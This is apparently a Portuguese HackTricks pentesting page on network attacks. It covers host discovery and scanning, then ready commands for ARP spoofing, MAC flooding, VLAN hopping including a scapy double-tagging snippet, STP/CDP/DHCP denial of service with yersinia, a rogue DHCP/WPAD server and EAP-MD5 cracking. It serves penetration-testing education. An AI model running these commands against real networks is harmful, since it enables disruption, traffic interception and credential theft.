# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## Descobrindo hosts do lado de fora

Esta será uma **seção breve** sobre como encontrar **IPs respondendo** da **Internet**.\
Nesta situação, você tem algum **escopo de IPs** (talvez até vários **intervalos**) e você só precisa descobrir **quais IPs estão respondendo**.

### ICMP

Esta é a maneira **mais fácil** e **rápida** de descobrir se um host está ativo ou não.\
Você pode tentar enviar alguns pacotes **ICMP** e **esperar respostas**. A maneira mais fácil é apenas enviar um **echo request** e esperar pela resposta. Você pode fazer isso usando um simples `ping` ou usando `fping` para **intervalos**.\
Você também pode usar **nmap** para enviar outros tipos de pacotes ICMP (isso evitará filtros para solicitações-respostas ICMP echo comuns).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Descoberta de Portas TCP

É muito comum encontrar que todos os tipos de pacotes ICMP estão sendo filtrados. Então, tudo o que você pode fazer para verificar se um host está ativo é **tentar encontrar portas abertas**. Cada host tem **65535 portas**, então, se você tiver um escopo "grande", você **não pode** testar se **cada porta** de cada host está aberta ou não, isso levará muito tempo.\
Então, o que você precisa é de um **scanner de portas rápido** ([masscan](https://github.com/robertdavidgraham/masscan)) e uma lista das **portas mais utilizadas:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Você também pode realizar esta etapa com `nmap`, mas é mais lento e de certa forma `nmap` tem problemas para identificar hosts ativos.

### Descoberta de Porta HTTP

Esta é apenas uma descoberta de porta TCP útil quando você deseja **focar na descoberta de serviços HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Descoberta de Porta UDP

Você também pode tentar verificar se há alguma **porta UDP aberta** para decidir se deve **prestar mais atenção** a um **host.** Como os serviços UDP geralmente **não respondem** com **nenhum dado** a um pacote de sondagem UDP vazio, é difícil dizer se uma porta está sendo filtrada ou aberta. A maneira mais fácil de decidir isso é enviar um pacote relacionado ao serviço em execução, e como você não sabe qual serviço está em execução, deve tentar o mais provável com base no número da porta:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
A linha do nmap proposta anteriormente testará as **1000 principais portas UDP** em cada host dentro do intervalo **/24**, mas mesmo isso levará **>20min**. Se precisar de **resultados mais rápidos**, você pode usar [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24`. Isso enviará esses **probes UDP** para suas **portas esperadas** (para um intervalo /24, isso levará apenas 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Descoberta de Portas SCTP
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Aqui você pode encontrar um bom guia de todos os ataques Wifi bem conhecidos na época da escrita:

{{#ref}}
../pentesting-wifi/
{{#endref}}

## Descobrindo hosts de dentro

Se você estiver dentro da rede, uma das primeiras coisas que você vai querer fazer é **descobrir outros hosts**. Dependendo de **quanto ruído** você pode/deseja fazer, diferentes ações podem ser realizadas:

### Passivo

Você pode usar essas ferramentas para descobrir hosts de forma passiva dentro de uma rede conectada:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Ativo

Note que as técnicas comentadas em [_**Descobrindo hosts do lado de fora**_](./#discovering-hosts-from-the-outside) (_Descoberta de Portas TCP/HTTP/UDP/SCTP_) também podem ser **aplicadas aqui**.\
Mas, como você está na **mesma rede** que os outros hosts, você pode fazer **mais coisas**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Note que as técnicas comentadas em _Descobrindo hosts do exterior_ ([_**ICMP**_](./#icmp)) também podem ser **aplicadas aqui**.\
Mas, como você está na **mesma rede** que os outros hosts, você pode fazer **mais coisas**:

- Se você **pingar** um **endereço de broadcast de sub-rede**, o ping deve chegar a **cada host** e eles podem **responder** a **você**: `ping -b 10.10.5.255`
- Pingar o **endereço de broadcast da rede** pode até encontrar hosts dentro de **outras sub-redes**: `ping -b 255.255.255.255`
- Use as flags `-PE`, `-PP`, `-PM` do `nmap` para realizar a descoberta de hosts enviando respectivamente **ICMPv4 echo**, **timestamp** e **solicitações de máscara de sub-rede:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan é usado para **ligar** computadores através de uma **mensagem de rede**. O pacote mágico usado para ligar o computador é apenas um pacote onde um **MAC Dst** é fornecido e então é **repetido 16 vezes** dentro do mesmo pacote.\
Então, esse tipo de pacotes geralmente é enviado em um **ethernet 0x0842** ou em um **pacote UDP para a porta 9**.\
Se **nenhum \[MAC]** for fornecido, o pacote é enviado para **broadcast ethernet** (e o MAC de broadcast será o que está sendo repetido).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Escaneando Hosts

Uma vez que você tenha descoberto todos os IPs (externos ou internos) que deseja escanear em profundidade, diferentes ações podem ser realizadas.

### TCP

- **Porta** aberta: _SYN --> SYN/ACK --> RST_
- **Porta** fechada: _SYN --> RST/ACK_
- **Porta** filtrada: _SYN --> \[SEM RESPOSTA]_
- **Porta** filtrada: _SYN --> mensagem ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Existem 2 opções para escanear uma porta UDP:

- Enviar um **pacote UDP** e verificar a resposta _**ICMP unreachable**_ se a porta estiver **fechada** (em vários casos, o ICMP será **filtrado**, então você não receberá nenhuma informação se a porta estiver fechada ou aberta).
- Enviar **datagramas formatados** para provocar uma resposta de um **serviço** (por exemplo, DNS, DHCP, TFTP e outros, conforme listado em _nmap-payloads_). Se você receber uma **resposta**, então a porta está **aberta**.

**Nmap** irá **misturar ambas** as opções usando "-sV" (os escaneamentos UDP são muito lentos), mas observe que os escaneamentos UDP são mais lentos do que os escaneamentos TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** é projetado para ser usado junto com **TCP (Transmission Control Protocol)** e **UDP (User Datagram Protocol)**. Seu principal objetivo é facilitar o transporte de dados de telefonia sobre redes IP, espelhando muitos dos recursos de confiabilidade encontrados no **Signaling System 7 (SS7)**. **SCTP** é um componente central da família de protocolos **SIGTRAN**, que visa transportar sinais SS7 sobre redes IP.

O suporte para **SCTP** é fornecido por vários sistemas operacionais, como **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** e **VxWorks**, indicando sua ampla aceitação e utilidade no campo de telecomunicações e redes.

Dois tipos diferentes de varreduras para SCTP são oferecidos pelo nmap: _-sY_ e _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Evasão de IDS e IPS

{{#ref}}
ids-evasion.md
{{#endref}}

### **Mais opções do nmap**

{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Revelando Endereços IP Internos

**Roteadores, firewalls e dispositivos de rede mal configurados** às vezes respondem a sondagens de rede usando **endereços de origem não públicos**. **tcpdump** pode ser utilizado para identificar pacotes recebidos de endereços privados durante os testes. Especificamente, no Kali Linux, pacotes podem ser capturados na **interface eth2**, que é acessível a partir da Internet pública. É importante notar que, se sua configuração estiver atrás de um NAT ou um Firewall, tais pacotes provavelmente serão filtrados.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Com o Sniffing, você pode aprender detalhes sobre faixas de IP, tamanhos de sub-rede, endereços MAC e nomes de host ao revisar quadros e pacotes capturados. Se a rede estiver mal configurada ou se o fabric de comutação estiver sob estresse, os atacantes podem capturar material sensível por meio de sniffing de rede passivo.

Se uma rede Ethernet comutada estiver configurada corretamente, você verá apenas quadros de broadcast e material destinado ao seu endereço MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Também é possível capturar pacotes de uma máquina remota através de uma sessão SSH com o Wireshark como interface gráfica em tempo real.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Obviamente.

### Capturando credenciais

Você pode usar ferramentas como [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) para analisar credenciais de um pcap ou de uma interface ao vivo.

## Ataques LAN

### Spoofing ARP

O Spoofing ARP consiste em enviar ARPResponses gratuitos para indicar que o IP de uma máquina possui o MAC do nosso dispositivo. Assim, a vítima mudará a tabela ARP e entrará em contato com nossa máquina toda vez que quiser contatar o IP spoofed.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Transbordar a tabela CAM do switch enviando muitos pacotes com diferentes endereços MAC de origem. Quando a tabela CAM está cheia, o switch começa a se comportar como um hub (broadcasting todo o tráfego).
```bash
macof -i <interface>
```
Em switches modernos, essa vulnerabilidade foi corrigida.

### Ataques 802.1Q VLAN / DTP

#### Trunking Dinâmico

O **Dynamic Trunking Protocol (DTP)** é projetado como um protocolo de camada de enlace para facilitar um sistema automático de trunking, permitindo que os switches selecionem automaticamente portas para o modo trunk (Trunk) ou modo não-trunk. A implementação do **DTP** é frequentemente vista como indicativa de um design de rede subótimo, ressaltando a importância de configurar trunks manualmente apenas onde necessário e garantir a documentação adequada.

Por padrão, as portas dos switches são configuradas para operar no modo Dynamic Auto, o que significa que estão prontas para iniciar o trunking se solicitadas por um switch vizinho. Uma preocupação de segurança surge quando um pentester ou atacante se conecta ao switch e envia um quadro DTP Desirable, forçando a porta a entrar no modo trunk. Essa ação permite que o atacante enumere VLANs por meio da análise de quadros STP e contorne a segmentação de VLAN ao configurar interfaces virtuais.

A presença do DTP em muitos switches por padrão pode ser explorada por adversários para imitar o comportamento de um switch, obtendo assim acesso ao tráfego em todas as VLANs. O script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) é utilizado para monitorar uma interface, revelando se um switch está no modo Default, Trunk, Dynamic, Auto ou Access—sendo este último a única configuração imune a ataques de VLAN hopping. Esta ferramenta avalia o status de vulnerabilidade do switch.

Caso uma vulnerabilidade de rede seja identificada, a ferramenta _**Yersinia**_ pode ser empregada para "habilitar trunking" via o protocolo DTP, permitindo a observação de pacotes de todas as VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Para enumerar as VLANs, também é possível gerar o quadro DTP Desirable com o script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. N**ão interrompa o script sob nenhuma circunstância. Ele injeta DTP Desirable a cada três segundos. **Os canais de trunk criados dinamicamente no switch vivem apenas por cinco minutos. Após cinco minutos, o trunk cai.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Gostaria de ressaltar que **Access/Desirable (0x03)** indica que o quadro DTP é do tipo Desirable, o que informa à porta para mudar para o modo Trunk. E **802.1Q/802.1Q (0xa5)** indica o tipo de encapsulamento **802.1Q**.

Ao analisar os quadros STP, **aprendemos sobre a existência da VLAN 30 e da VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Atacando VLANs específicas

Uma vez que você conhece os IDs de VLAN e os valores de IP, você pode **configurar uma interface virtual para atacar uma VLAN específica**.\
Se o DHCP não estiver disponível, use _ifconfig_ para definir um endereço IP estático.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

O ataque discutido de **Dynamic Trunking e criação de interfaces virtuais para descobrir hosts dentro** de outras VLANs é **realizado automaticamente** pela ferramenta: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Se um atacante souber o valor do **MAC, IP e VLAN ID do host vítima**, ele pode tentar **double tag um frame** com sua VLAN designada e a VLAN da vítima e enviar um pacote. Como a **vítima não conseguirá se conectar de volta** com o atacante, a **melhor opção para o atacante é se comunicar via UDP** com protocolos que podem realizar algumas ações interessantes (como SNMP).

Outra opção para o atacante é lançar um **TCP port scan spoofing um IP controlado pelo atacante e acessível pela vítima** (provavelmente através da internet). Então, o atacante poderia sniffar no segundo host de sua propriedade se ele receber alguns pacotes da vítima.

![](<../../images/image (190).png>)

Para realizar este ataque, você pode usar scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Bypass de Segmentação Lateral de VLAN <a href="#d679" id="d679"></a>

Se você tiver **acesso a um switch ao qual está diretamente conectado**, você tem a capacidade de **contornar a segmentação de VLAN** dentro da rede. Basta **mudar a porta para o modo trunk** (também conhecido como trunk), criar interfaces virtuais com os IDs das VLANs de destino e configurar um endereço IP. Você pode tentar solicitar o endereço dinamicamente (DHCP) ou pode configurá-lo estaticamente. Depende do caso.

{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Bypass de VLAN Privada de Camada 3

Em certos ambientes, como redes sem fio para convidados, as configurações de **isolamento de porta (também conhecido como VLAN privada)** são implementadas para impedir que clientes conectados a um ponto de acesso sem fio se comuniquem diretamente entre si. No entanto, uma técnica foi identificada que pode contornar essas medidas de isolamento. Essa técnica explora a falta de ACLs de rede ou sua configuração inadequada, permitindo que pacotes IP sejam roteados através de um roteador para alcançar outro cliente na mesma rede.

O ataque é executado criando um **pacote que carrega o endereço IP do cliente de destino, mas com o endereço MAC do roteador**. Isso faz com que o roteador encaminhe erroneamente o pacote para o cliente alvo. Essa abordagem é semelhante à usada em Ataques de Double Tagging, onde a capacidade de controlar um host acessível à vítima é usada para explorar a falha de segurança.

**Passos Chave do Ataque:**

1. **Elaboração de um Pacote:** Um pacote é especialmente elaborado para incluir o endereço IP do cliente alvo, mas com o endereço MAC do roteador.
2. **Exploração do Comportamento do Roteador:** O pacote elaborado é enviado ao roteador, que, devido à configuração, redireciona o pacote para o cliente alvo, contornando o isolamento fornecido pelas configurações de VLAN privada.

### Ataques VTP

O VTP (VLAN Trunking Protocol) centraliza a gestão de VLAN. Ele utiliza números de revisão para manter a integridade do banco de dados de VLAN; qualquer modificação incrementa esse número. Os switches adotam configurações com números de revisão mais altos, atualizando seus próprios bancos de dados de VLAN.

#### Funções do Domínio VTP

- **Servidor VTP:** Gerencia VLANs—cria, exclui, modifica. Ele transmite anúncios VTP para os membros do domínio.
- **Cliente VTP:** Recebe anúncios VTP para sincronizar seu banco de dados de VLAN. Esse papel é restrito de modificações de configuração de VLAN local.
- **Transparente VTP:** Não participa de atualizações VTP, mas encaminha anúncios VTP. Não é afetado por ataques VTP, mantendo um número de revisão constante de zero.

#### Tipos de Anúncios VTP

- **Anúncio Resumido:** Transmitido pelo servidor VTP a cada 300 segundos, carregando informações essenciais do domínio.
- **Anúncio de Subconjunto:** Enviado após alterações na configuração da VLAN.
- **Solicitação de Anúncio:** Emitida por um cliente VTP para solicitar um Anúncio Resumido, tipicamente em resposta à detecção de um número de revisão de configuração mais alto.

As vulnerabilidades do VTP são exploráveis exclusivamente através de portas trunk, uma vez que os anúncios VTP circulam apenas por elas. Cenários pós-ataque DTP podem se voltar para o VTP. Ferramentas como Yersinia podem facilitar ataques VTP, visando eliminar o banco de dados de VLAN, efetivamente interrompendo a rede.

Nota: Esta discussão refere-se à versão 1 do VTP (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
No modo gráfico do Yersinia, escolha a opção de deletar todos os VTP vlans para purgar o banco de dados VLAN.

### Ataques STP

**Se você não consegue capturar frames BPDU em suas interfaces, é improvável que você tenha sucesso em um ataque STP.**

#### **STP BPDU DoS**

Enviando muitos BPDUs TCP (Notificação de Mudança de Topologia) ou Conf (os BPDUs que são enviados quando a topologia é criada), os switches ficam sobrecarregados e param de funcionar corretamente.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Ataque STP TCP**

Quando um TCP é enviado, a tabela CAM dos switches será deletada em 15s. Então, se você estiver enviando continuamente esse tipo de pacotes, a tabela CAM será reiniciada continuamente (ou a cada 15 segundos) e quando for reiniciada, o switch se comporta como um hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Ataque STP Root**

O atacante simula o comportamento de um switch para se tornar o root STP da rede. Então, mais dados passarão por ele. Isso é interessante quando você está conectado a dois switches diferentes.\
Isso é feito enviando pacotes BPDUs CONF dizendo que o valor de **prioridade** é menor do que a prioridade real do switch root atual.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Se o atacante estiver conectado a 2 switches, ele pode ser a raiz da nova árvore e todo o tráfego entre esses switches passará por ele** (um ataque MITM será realizado).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Ataques CDP

O Protocolo de Descoberta CISCO (CDP) é essencial para a comunicação entre dispositivos CISCO, permitindo que eles **se identifiquem e compartilhem detalhes de configuração**.

#### Coleta de Dados Passiva <a href="#id-0e0f" id="id-0e0f"></a>

O CDP é configurado para transmitir informações através de todas as portas, o que pode levar a um risco de segurança. Um atacante, ao se conectar a uma porta de switch, poderia implantar sniffers de rede como **Wireshark**, **tcpdump** ou **Yersinia**. Essa ação pode revelar dados sensíveis sobre o dispositivo de rede, incluindo seu modelo e a versão do Cisco IOS que ele executa. O atacante pode então direcionar vulnerabilidades específicas na versão do Cisco IOS identificada.

#### Induzindo a Inundação da Tabela CDP <a href="#id-0d6a" id="id-0d6a"></a>

Uma abordagem mais agressiva envolve lançar um ataque de Negação de Serviço (DoS) sobrecarregando a memória do switch, fingindo ser dispositivos CISCO legítimos. Abaixo está a sequência de comandos para iniciar tal ataque usando Yersinia, uma ferramenta de rede projetada para testes:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Durante este ataque, a CPU do switch e a tabela de vizinhos CDP estão sobrecarregadas, levando ao que muitas vezes é referido como **“paralisia da rede”** devido ao consumo excessivo de recursos.

#### Ataque de Impersonação CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Você também pode usar [**scapy**](https://github.com/secdev/scapy/). Certifique-se de instalá-lo com o pacote `scapy/contrib`.

### Ataques VoIP e a Ferramenta VoIP Hopper

Os telefones VoIP, cada vez mais integrados a dispositivos IoT, oferecem funcionalidades como desbloquear portas ou controlar termostatos através de números de telefone especiais. No entanto, essa integração pode apresentar riscos de segurança.

A ferramenta [**voiphopper**](http://voiphopper.sourceforge.net) é projetada para emular um telefone VoIP em vários ambientes (Cisco, Avaya, Nortel, Alcatel-Lucent). Ela descobre o ID da VLAN da rede de voz usando protocolos como CDP, DHCP, LLDP-MED e 802.1Q ARP.

**VoIP Hopper** oferece três modos para o Protocolo de Descoberta Cisco (CDP):

1. **Modo Sniff** (`-c 0`): Analisa pacotes de rede para identificar o ID da VLAN.
2. **Modo Spoof** (`-c 1`): Gera pacotes personalizados imitando os de um dispositivo VoIP real.
3. **Modo Spoof com Pacote Pré-fabricado** (`-c 2`): Envia pacotes idênticos aos de um modelo específico de telefone IP Cisco.

O modo preferido para velocidade é o terceiro. Ele requer a especificação de:

- A interface de rede do atacante (`-i` parâmetro).
- O nome do dispositivo VoIP sendo emulado (`-E` parâmetro), aderindo ao formato de nomenclatura Cisco (por exemplo, SEP seguido de um endereço MAC).

Em ambientes corporativos, para imitar um dispositivo VoIP existente, pode-se:

- Inspecionar o rótulo MAC no telefone.
- Navegar nas configurações de exibição do telefone para visualizar informações do modelo.
- Conectar o dispositivo VoIP a um laptop e observar solicitações CDP usando o Wireshark.

Um comando de exemplo para executar a ferramenta no terceiro modo seria:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Ataques DHCP

#### Enumeração
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Dois tipos de DoS** podem ser realizados contra servidores DHCP. O primeiro consiste em **simular hosts falsos suficientes para usar todos os endereços IP possíveis**.\
Esse ataque funcionará apenas se você puder ver as respostas do servidor DHCP e completar o protocolo (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Por exemplo, isso **não é possível em redes Wifi**.

Outra maneira de realizar um DoS DHCP é enviar um **pacote DHCP-RELEASE usando como código de origem todos os IPs possíveis**. Assim, o servidor pensará que todos terminaram de usar o IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Uma maneira mais automática de fazer isso é usando a ferramenta [DHCPing](https://github.com/kamorin/DHCPig)

Você poderia usar os ataques DoS mencionados para forçar os clientes a obter novos leases dentro do ambiente e esgotar servidores legítimos para que eles fiquem não responsivos. Assim, quando os legítimos tentarem se reconectar, **você pode servir valores maliciosos mencionados no próximo ataque**.

#### Definir valores maliciosos

Um servidor DHCP malicioso pode ser configurado usando o script DHCP localizado em `/usr/share/responder/DHCP.py`. Isso é útil para ataques de rede, como capturar tráfego HTTP e credenciais, redirecionando o tráfego para um servidor malicioso. No entanto, configurar um gateway malicioso é menos eficaz, pois isso apenas permite capturar o tráfego de saída do cliente, perdendo as respostas do verdadeiro gateway. Em vez disso, recomenda-se configurar um servidor DNS ou WPAD malicioso para um ataque mais eficaz.

Abaixo estão as opções de comando para configurar o servidor DHCP malicioso:

- **Nosso Endereço IP (Anúncio de Gateway)**: Use `-i 10.0.0.100` para anunciar o IP da sua máquina como o gateway.
- **Nome de Domínio DNS Local**: Opcionalmente, use `-d example.org` para definir um nome de domínio DNS local.
- **IP do Roteador/Gateway Original**: Use `-r 10.0.0.1` para especificar o endereço IP do roteador ou gateway legítimo.
- **IP do Servidor DNS Primário**: Use `-p 10.0.0.100` para definir o endereço IP do servidor DNS malicioso que você controla.
- **IP do Servidor DNS Secundário**: Opcionalmente, use `-s 10.0.0.1` para definir um IP de servidor DNS secundário.
- **Máscara de Rede Local**: Use `-n 255.255.255.0` para definir a máscara de rede para a rede local.
- **Interface para Tráfego DHCP**: Use `-I eth1` para escutar o tráfego DHCP em uma interface de rede específica.
- **Endereço de Configuração WPAD**: Use `-w “http://10.0.0.100/wpad.dat”` para definir o endereço para configuração WPAD, auxiliando na interceptação de tráfego web.
- **Falsificar IP do Gateway Padrão**: Inclua `-S` para falsificar o endereço IP do gateway padrão.
- **Responder a Todos os Pedidos DHCP**: Inclua `-R` para fazer o servidor responder a todos os pedidos DHCP, mas esteja ciente de que isso é barulhento e pode ser detectado.

Usando corretamente essas opções, um servidor DHCP malicioso pode ser estabelecido para interceptar o tráfego de rede de forma eficaz.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Ataques EAP**

Aqui estão algumas das táticas de ataque que podem ser usadas contra implementações 802.1X:

- Força bruta ativa de senhas via EAP
- Atacando o servidor RADIUS com conteúdo EAP malformado _\*\*_(exploits)
- Captura de mensagens EAP e quebra de senha offline (EAP-MD5 e PEAP)
- Forçando a autenticação EAP-MD5 para contornar a validação do certificado TLS
- Injetando tráfego de rede malicioso ao autenticar usando um hub ou similar

Se o atacante estiver entre a vítima e o servidor de autenticação, ele pode tentar degradar (se necessário) o protocolo de autenticação para EAP-MD5 e capturar a tentativa de autenticação. Então, ele poderia usar força bruta para isso:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) é uma classe de protocolos de rede projetados para **criar um sistema de roteamento redundante ativo**. Com o FHRP, roteadores físicos podem ser combinados em um único dispositivo lógico, o que aumenta a tolerância a falhas e ajuda a distribuir a carga.

**Engenheiros da Cisco Systems desenvolveram dois protocolos FHRP, GLBP e HSRP.**

{{#ref}}
